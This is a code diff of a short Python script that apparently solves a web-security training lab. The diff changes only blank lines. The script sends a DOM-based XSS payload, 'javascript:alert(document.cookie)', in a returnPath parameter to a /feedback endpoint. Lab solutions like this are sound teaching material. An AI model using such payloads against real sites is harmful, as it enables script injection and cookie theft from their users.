@@ -3,6 +3,7 @@ from urllib.parse import urljoin
 
 import requests
 
+
 def solve_lab(url, proxies):
     url = urljoin(url, "/feedback")
     params = {"returnPath": "javascript:alert(document.cookie)"}
@@ -13,4 +14,3 @@ def solve_lab(url, proxies):
 
     requests.get(url, params=params, proxies=proxies, verify=False)
     print_success("DOM-based XSS attack performed.\n")
-
